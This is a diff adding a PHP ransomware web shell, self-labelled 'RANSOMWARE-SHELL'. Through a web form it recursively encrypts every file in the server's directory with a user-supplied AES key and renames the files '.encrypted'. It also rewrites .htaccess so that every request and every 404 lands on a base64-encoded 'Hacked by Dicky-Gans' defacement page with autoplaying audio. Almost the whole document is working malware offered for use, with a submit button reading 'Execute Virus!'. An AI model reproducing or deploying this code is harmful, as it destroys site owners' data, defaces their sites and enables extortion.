@@ -1,0 +1,177 @@
+<?php
+error_reporting(0);
+set_time_limit(0);
+ini_set('memory_limit', '-1');
+class deRanSomeware
+{
+   public function shcpackInstall(){
+    if(!file_exists(".htaencrypted")){
+      rename(".htaccess", ".htaencrypted");
+      if(fwrite(fopen('.htaccess', 'w'), "#Cracker Ransomware\r\nDirectoryIndex X6X.php\r\nErrorDocument 404 /X6X.php")){
+            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+      }
+      if(file_put_contents("X6X.php", base64_decode("PCEtLSBQYXMgZ3VhIGJpa2luIHNjcmlwdCBpbmkgbGFnaSBnYWxhdSBiYW5nZXQgZ2lsYS0tPiA8IS0tIFB1c2luZyBiYW5nZXQgZ2lsYS0tPiA8aHRtPjxoZWFkPiA8bWV0YSBjb250ZW50PSdIYWNrZWQgYnkgRGlja3kgR2FucyhCdWwvczRpdC4xMDEpJyBwcm9wZXJ0eT0nb2c6dGl0bGUnLz4gPG1ldGEgY29udGVudD0nYXJ0aWNsZScgcHJvcGVydHk9J29nOnR5cGUnLz4gPG1ldGEgY29udGVudD0nTGhvIGhla2VyIGdvYmxvaycgcHJvcGVydHk9J29nOnVybCcvPiA8dGl0bGU+KERpY2t5LUdhbnMpPC90aXRsZT4gPGJvZHkgYmdjb2xvcj0iYmxhY2siPiA8c3R5bGU+IGgxIHsgdGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjogIzMzMzVjZjsgZm9udC1zaXplOiAzNXB4OyBmb250LWZhbWlseTogQXJpYWwgTmFycm93LCBzYW5zLXNlcmlmOyBmb250LXN0eWxlOiBnYXJhbW9uZDsgdGV4dC1zaGFkb3c6IDEwMHZtYXggI2YwMDUwNTs+IHRleHQtc2hhZG93OiAwcHggMHB4IDBweCAjZjAwNTA1Oz4gPC9zdHlsZT4gPGgxPkdhdXNhaCBBbGF5PC9oMT48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxjZW50ZXI+PC9mb250PjwvY2VudGVyPiA8Y2VudGVyPjxmb250IGNvbG9yPSMwNzdmMDEgc2l6ZT0xNSBmYWNlPWNvdXJpZXIgbmV3PkhhY2tlZCBieSBEaWNreS1HYW5zPC9mb250PjxjZW50ZXI+IDxjZW50ZXI+PGZvbnQgY29sb3I9I2M2YzVjNCBzaXplPTYgZmFjZT1jb3VyaWVyIG5ldz5bIDxmb250IGNvbG9yPSNhM2EyYTE+U3VyYWthcnRhIFZzIFlvdT88Zm9udCBjb2xvcj0jYzZjNWM0PiBdPC9mb250PjwvY2VudGVyPgo8YnI+Cgk8dGl0bGU+RGlja3ktR2FuczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgk8IS0tIE1lbmFtcGlsa2FuIEphbSAoQWt0aWYpIC0tPgoJPGRpdiBpZD0iY2xvY2siPjwvZGl2PgoJCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCQk8IS0tCgkJZnVuY3Rpb24gc2hvd1RpbWUoKSB7CgkJICAgIHZhciBhX3AgPSAiIjsKCQkgICAgdmFyIHRvZGF5ID0gbmV3IERhdGUoKTsKCQkgICAgdmFyIGN1cnJfaG91ciA9IHRvZGF5LmdldEhvdXJzKCk7CgkJICAgIHZhciBjdXJyX21pbnV0ZSA9IHRvZGF5LmdldE1pbnV0ZXMoKTsKCQkgICAgdmFyIGN1cnJfc2Vjb25kID0gdG9kYXkuZ2V0U2Vjb25kcygpOwoJCSAgICBpZiAoY3Vycl9ob3VyIDwgMTIpIHsKCQkgICAgICAgIGFfcCA9ICJBTSI7CgkJICAgIH0gZWxzZSB7CgkJICAgICAgICBhX3AgPSAiUE0iOwoJCSAgICB9CgkJICAgIGlmIChjdXJyX2hvdXIgPT0gMCkgewoJCSAgICAgICAgY3Vycl9ob3VyID0gMTI7CgkJICAgIH0KCQkgICAgaWYgKGN1cnJfaG91ciA+IDEyKSB7CgkJICAgICAgICBjdXJyX2hvdXIgPSBjdXJyX2hvdXIgLSAxMjsKCQkgICAgfQoJCSAgICBjdXJyX2hvdXIgPSBjaGVja1RpbWUoY3Vycl9ob3VyKTsKCQkgICAgY3Vycl9taW51dGUgPSBjaGVja1RpbWUoY3Vycl9taW51dGUpOwoJCSAgICBjdXJyX3NlY29uZCA9IGNoZWNrVGltZShjdXJyX3NlY29uZCk7CgkJIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjbG9jaycpLmlubmVySFRNTD1jdXJyX2hvdXIgKyAiOiIgKyBjdXJyX21pbnV0ZSArICI6IiArIGN1cnJfc2Vjb25kICsgIiAiICsgYV9wOwoJCSAgICB9CiAKCQlmdW5jdGlvbiBjaGVja1RpbWUoaSkgewoJCSAgICBpZiAoaSA8IDEwKSB7CgkJICAgICAgICBpID0gIjAiICsgaTsKCQkgICAgfQoJCSAgICByZXR1cm4gaTsKCQl9CgkJc2V0SW50ZXJ2YWwoc2hvd1RpbWUsIDUwMCk7CgkJLy8tLT4KCQk8L3NjcmlwdD4KIAoJCTwhLS0gTWVuYW1waWxrYW4gSGFyaSwgQnVsYW4gZGFuIFRhaHVuIC0tPgoJCTxicj4KCQk8c2NyaXB0IHR5cGU9J3RleHQvamF2YXNjcmlwdCc+CgkJCTwhLS0KCQkJdmFyIG1vbnRocyA9IFsnSmFudWFyaScsICdGZWJydWFyaScsICdNYXJldCcsICdBcHJpbCcsICdNZWknLCAnSnVuaScsICdKdWxpJywgJ0FndXN0dXMnLCAnU2VwdGVtYmVyJywgJ09rdG9iZXInLCAnTm92ZW1iZXInLCAnRGVzZW1iZXInXTsKCQkJdmFyIG15RGF5cyA9IFsnTWluZ2d1JywgJ1NlbmluJywgJ1NlbGFzYScsICdSYWJ1JywgJ0thbWlzJywgJ0p1bSYjMzk7YXQnLCAnU2FidHUnXTsKCQkJdmFyIGRhdGUgPSBuZXcgRGF0ZSgpOwoJCQl2YXIgZGF5ID0gZGF0ZS5nZXREYXRlKCk7CgkJCXZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKTsKCQkJdmFyIHRoaXNEYXkgPSBkYXRlLmdldERheSgpLAoJCQkgICAgdGhpc0RheSA9IG15RGF5c1t0aGlzRGF5XTsKCQkJdmFyIHl5ID0gZGF0ZS5nZXRZZWFyKCk7CgkJCXZhciB5ZWFyID0gKHl5IDwgMTAwMCkgPyB5eSArIDE5MDAgOiB5eTsKCQkJZG9jdW1lbnQud3JpdGUodGhpc0RheSArICcsICcgKyBkYXkgKyAnICcgKyBtb250aHNbbW9udGhdICsgJyAnICsgeWVhcik7CgkJCS8vLS0+CgkJPC9zY3JpcHQ+Cgo8L2NlbnRlcj4KPGJyPgoJPGF1ZGlvIGlkPSJteUF1ZGlvIj4KCiAgICAgICAgICAgIDxzb3VyY2Ugc3JjPSJodHRwczovL2oudG9wNHRvcC5pby9tXzE3NDJsNWxsaDYubXAzIiB0eXBlPSJhdWRpby9vZ2ciPgoKICAgICAgICAgICAgPHNvdXJjZSBzcmM9Imh0dHBzOi8vai50b3A0dG9wLmlvL21fMTc0Mmw1bGxoNi5tcDMiIHR5cGU9ImF1ZGlvL21wZWciPgoKICAgICAgICA8L2F1ZGlvPgoKICAgICAgICA8YnV0dG9uIG9uY2xpY2s9InBsYXlBdWRpbygpIiBjbGFzcz0iYnRubiIgdHlwZT0iYnV0dG9uIj5QbGF5PC9idXR0b24+CgogICAgICAgICZuYnNwOyZuYnNwOwoKICAgICAgICA8YnV0dG9uIG9uY2xpY2s9InBhdXNlQXVkaW8oKSIgY2xhc3M9ImJ0bm4iIHR5cGU9ImJ1dHRvbiI+UGF1c2U8L2J1dHRvbj48L2NlbnRlcj4KCiAgICAgICAgPHNjcmlwdD4KCiAgICAgICAgICAgICAgdmFyIHggPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibXlBdWRpbyIpOyAKCgoKICAgICAgICAgICAgICBmdW5jdGlvbiBwbGF5QXVkaW8oKSB7IAoKICAgICAgICAgICAgICAgICAgeC5wbGF5KCk7IAoKICAgICAgICAgICAgICB9IAoKCgogICAgICAgICAgICAgICBmdW5jdGlvbiBwYXVzZUF1ZGlvKCkgeyAKCiAgICAgICAgICAgICAgICAgIHgucGF1c2UoKTsgCgogICAgICAgICAgICAgIH0gCgogICAgICAgIDwvc2NyaXB0PgoKICAgIDwvY2VudGVyPgoKCgo8L2Rpdj4K"))){
+            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  X6X.php (Default Page)<br>';
+      }
+    }
+   }
+   public function shcpackUnstall(){
+      if( file_exists(".htaencrypted") ){
+        if( unlink(".htaccess") && unlink("X6X.php") ){
+          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> X6X.php (Default Page)<br>';
+        }
+        rename(".htaencrypted", ".htaccess");
+      }
+   }
+   public function plus(){
+      flush();
+      ob_flush();
+   }
+   public function locate(){
+        return getcwd();
+    }
+   public function shcdirs($dir,$method,$key){
+        switch ($method) {
+          case '1':
+            deRanSomeware::shcpackInstall();
+          break;
+          case '2':
+           deRanSomeware::shcpackUnstall();
+          break;
+        }
+        foreach(scandir($dir) as $d)
+        {
+            if($d!='.' && $d!='..')
+            {
+                $locate = $dir.DIRECTORY_SEPARATOR.$d;
+                if(!is_dir($locate)){
+                   if(  deRanSomeware::kecuali($locate,"Htta.php")  && deRanSomeware::kecuali($locate,"d.php")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"X6X.php") &&  deRanSomeware::kecuali($locate,"X6X.php") && deRanSomeware::kecuali($locate,".htaencrypted") ){
+                     switch ($method) {
+                        case '1':
+                           deRanSomeware::shcEnCry($key,$locate);
+                           deRanSomeware::shcEnDesDirS($locate,"1");
+                        break;
+                        case '2':
+                           deRanSomeware::shcDeCry($key,$locate);
+                           deRanSomeware::shcEnDesDirS($locate,"2");
+                        break;
+                     }
+                   }
+                }else{
+                  deRanSomeware::shcdirs($locate,$method,$key);
+                }
+            }
+            deRanSomeware::plus();
+        }
+   }
+   
+   public function shcEnDesDirS($locate,$method){
+      switch ($method) {
+        case '1':
+          rename($locate, $locate.".encrypted");
+        break;
+        case '2':
+          $locates = str_replace(".encrypted", "", $locate);
+          rename($locate, $locates);
+        break;
+      }
+   }
+   public function shcEnCry($key,$locate){
+      $data = file_get_contents($locate);
+      $iv = mcrypt_create_iv(
+          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
+          MCRYPT_DEV_URANDOM
+      );
+      $encrypted = base64_encode(
+          $iv .
+          mcrypt_encrypt(
+              MCRYPT_RIJNDAEL_128,
+              hash('sha256', $key, true),
+              $data,
+              MCRYPT_MODE_CBC,
+              $iv
+          )
+      );
+      if(file_put_contents($locate,  $encrypted )){
+         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }else{
+         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
+      }
+   }
+   public function shcDeCry($key,$locate){
+      $data = base64_decode( file_get_contents($locate) );
+      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
+      $decrypted = rtrim(
+          mcrypt_decrypt(
+              MCRYPT_RIJNDAEL_128,
+              hash('sha256', $key, true),
+              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
+              MCRYPT_MODE_CBC,
+              $iv
+          ),
+          "\0"
+      );
+      if(file_put_contents($locate,  $decrypted )){
+         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }else{
+         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }
+   }
+   public function kecuali($ext,$name){
+        $re = "/({$name})/";
+        preg_match($re, $ext, $matches);
+        if($matches[1]){
+            return false;
+        }
+            return true;
+     }
+}
+if($_POST['submit']){
+switch ($_POST['method']) {
+   case '1':
+      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
+   break;
+   case '2':
+     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
+   break;
+}
+}else{
+?>
+<center>
+<pre>
+<img src="https://kabardaerah.com/wp-content/uploads/2020/01/download-12.jpeg" width="350"/>
+{[Bul/s4it.101(Dicky)-RANSOMWARE-SHELL]}
+-[ CONTACT : dikymumet@gmail.com /Number Phone(Nomer Hp) 085718368296 ]-
+ 
+ System :  <?php echo php_uname()."\n";?>
+ Server : <?=$_SERVER['HTTP_HOST']."\n";?>
+ #RANSOMWARE INI BERADA PADA [DIR]: <?php echo
+ getcwd();?>/<?php $current_file_name =
+ basename($_SERVER['PHP_SELF']); echo
+ $current_file_name."\n"; ?>
+ </font>	
+</pre>
+
+<h2><font color='red' face = 'iceland' > Put Your Encryption/Decryption Key Here</h2> </font>
+
+<form action="" method="post" style=" text-align: center;">
+      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC"><br><br>
+	  <h2><font color='lime' face = 'iceland' > Post Type : </h2> </font> 
+     <select name="method" class="selecte">
+         <option value="1">Encrypt Files!</option>
+         <option value="2">Decrypt Files!</option>
+      </select><br><br>
+      <input type="submit" name="submit" class="submite" value="Execute Virus!" /><br>
+</form>
+
+<?php
+}?>
+
+ </center>
+ </div>
+</body>
+</html>
+
+
+<iframe width="0" height="0" src="https://a.top4top.io/m_1841cximu0.m4a" autostart="true" loop="true" frameborder="0"></iframe>
